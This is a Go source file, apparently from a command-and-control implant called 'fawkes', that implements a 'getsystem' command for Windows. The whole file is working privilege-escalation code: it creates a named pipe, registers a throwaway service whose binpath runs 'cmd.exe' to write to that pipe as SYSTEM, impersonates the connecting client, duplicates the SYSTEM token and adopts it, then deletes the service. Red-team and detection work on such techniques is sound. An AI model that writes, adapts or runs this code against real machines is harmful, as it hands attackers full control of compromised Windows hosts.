//go:build windows
// +build windows

package commands

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"strings"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc/mgr"
)

// Windows API procedures for named pipe impersonation
var (
	procCreateNamedPipeW          = kernel32.NewProc("CreateNamedPipeW")
	procConnectNamedPipe          = kernel32.NewProc("ConnectNamedPipe")
	procDisconnectNamedPipe       = kernel32.NewProc("DisconnectNamedPipe")
	procImpersonateNamedPipeClient = kernel32.NewProc("ImpersonateNamedPipeClient")
)

// Named pipe constants
const (
	PIPE_ACCESS_DUPLEX     = 0x00000003
	PIPE_TYPE_BYTE         = 0x00000000
	PIPE_READMODE_BYTE     = 0x00000000
	PIPE_WAIT              = 0x00000000
	PIPE_UNLIMITED_INSTANCES = 255
)

type GetSystemCommand struct{}

func (c *GetSystemCommand) Name() string {
	return "getsystem"
}

func (c *GetSystemCommand) Description() string {
	return "Elevate to SYSTEM via named pipe impersonation (requires SeImpersonate privilege)"
}

type getSystemArgs struct {
	Technique string `json:"technique"`
}

func (c *GetSystemCommand) Execute(task structs.Task) structs.CommandResult {
	var args getSystemArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	// Default to service trigger
	if args.Technique == "" {
		args.Technique = "service"
	}

	// Get current identity before escalation
	oldIdentity, _ := GetCurrentIdentity()

	switch strings.ToLower(args.Technique) {
	case "service":
		return getSystemViaService(oldIdentity)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown technique: %s. Available: service", args.Technique),
			Status:    "error",
			Completed: true,
		}
	}
}

// getSystemViaService creates a named pipe, creates a Windows service whose
// binpath writes to that pipe (running as SYSTEM), then impersonates the
// connecting client to obtain a SYSTEM token.
func getSystemViaService(oldIdentity string) structs.CommandResult {
	// Generate random pipe name
	pipeName, err := randomPipeName()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to generate pipe name: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	pipeFullPath := `\\.\pipe\` + pipeName

	// Create named pipe
	pipeNamePtr, err := windows.UTF16PtrFromString(pipeFullPath)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to create pipe name: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	hPipe, _, pipeErr := procCreateNamedPipeW.Call(
		uintptr(unsafe.Pointer(pipeNamePtr)),
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_BYTE|PIPE_READMODE_BYTE|PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		512,  // out buffer size
		512,  // in buffer size
		0,    // default timeout
		0,    // default security (allows SYSTEM)
	)
	if hPipe == uintptr(windows.InvalidHandle) {
		return structs.CommandResult{
			Output:    fmt.Sprintf("CreateNamedPipeW failed: %v", pipeErr),
			Status:    "error",
			Completed: true,
		}
	}
	defer windows.CloseHandle(windows.Handle(hPipe))

	// Create a temporary service that writes to our pipe
	svcName := "fwk" + pipeName[:8]
	binPath := fmt.Sprintf(`cmd.exe /c echo fawkes > %s`, pipeFullPath)

	scm, err := mgr.Connect()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to connect to SCM: %v (need admin privileges)", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer scm.Disconnect()

	svcHandle, err := scm.CreateService(svcName, binPath, mgr.Config{
		StartType:   uint32(mgr.StartManual),
		ErrorControl: mgr.ErrorIgnore,
	})
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to create service '%s': %v (need admin privileges)", svcName, err),
			Status:    "error",
			Completed: true,
		}
	}

	// Ensure service is cleaned up
	defer func() {
		svcHandle.Delete()
		svcHandle.Close()
	}()

	// Start the service in a goroutine — it will connect to our pipe
	// The service will fail to start properly (it's not a real service),
	// but the SCM will execute the binpath as SYSTEM before it fails.
	svcStarted := make(chan error, 1)
	go func() {
		err := svcHandle.Start()
		svcStarted <- err
	}()

	// Wait for pipe connection with timeout
	// ConnectNamedPipe blocks until a client connects
	connected := make(chan bool, 1)
	connectErr := make(chan error, 1)
	go func() {
		ret, _, err := procConnectNamedPipe.Call(hPipe, 0)
		if ret == 0 {
			// ERROR_PIPE_CONNECTED means client already connected before we called
			if err == windows.ERROR_PIPE_CONNECTED {
				connected <- true
				return
			}
			connectErr <- fmt.Errorf("ConnectNamedPipe failed: %v", err)
			return
		}
		connected <- true
	}()

	// Wait for connection or timeout
	select {
	case <-connected:
		// Client connected to pipe
	case err := <-connectErr:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Pipe connection failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	case <-time.After(10 * time.Second):
		return structs.CommandResult{
			Output:    "Timeout waiting for service to connect to pipe (10s). Ensure you have SeImpersonate and admin privileges.",
			Status:    "error",
			Completed: true,
		}
	}

	// Impersonate the connected client (SYSTEM)
	ret, _, err := procImpersonateNamedPipeClient.Call(hPipe)
	if ret == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("ImpersonateNamedPipeClient failed: %v (need SeImpersonate privilege)", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Get the impersonation token from current thread
	var threadToken windows.Token
	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
	if err != nil {
		procRevertToSelf.Call()
		return structs.CommandResult{
			Output:    fmt.Sprintf("OpenThreadToken failed after impersonation: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Duplicate to a primary token for full use
	var primaryToken windows.Token
	err = windows.DuplicateTokenEx(
		threadToken,
		windows.MAXIMUM_ALLOWED,
		nil,
		windows.SecurityImpersonation,
		windows.TokenPrimary,
		&primaryToken,
	)
	threadToken.Close()

	if err != nil {
		procRevertToSelf.Call()
		return structs.CommandResult{
			Output:    fmt.Sprintf("DuplicateTokenEx failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Revert before storing (SetIdentityToken will call ImpersonateLoggedOnUser)
	procRevertToSelf.Call()

	// Disconnect pipe client
	procDisconnectNamedPipe.Call(hPipe)

	// Store the SYSTEM token using existing token infrastructure
	if err := SetIdentityToken(primaryToken); err != nil {
		windows.CloseHandle(windows.Handle(primaryToken))
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to impersonate SYSTEM token: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Wait for service start goroutine to finish (service will fail, that's expected)
	select {
	case <-svcStarted:
		// Ignore error — service start always "fails" because cmd.exe isn't a real service
	case <-time.After(5 * time.Second):
		// Timeout is fine — we already got the token
	}

	// Verify the new identity
	newIdentity, err := GetCurrentIdentity()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("SYSTEM token obtained but failed to verify: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	var sb strings.Builder
	sb.WriteString("Successfully elevated to SYSTEM\n")
	sb.WriteString(fmt.Sprintf("Technique: Service named pipe impersonation\n"))
	if oldIdentity != "" {
		sb.WriteString(fmt.Sprintf("Old: %s\n", oldIdentity))
	}
	sb.WriteString(fmt.Sprintf("New: %s\n", newIdentity))
	sb.WriteString(fmt.Sprintf("Service '%s' created and deleted\n", svcName))
	sb.WriteString("Use rev2self to revert to original context")

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// randomPipeName generates a random pipe name using crypto/rand
func randomPipeName() (string, error) {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}
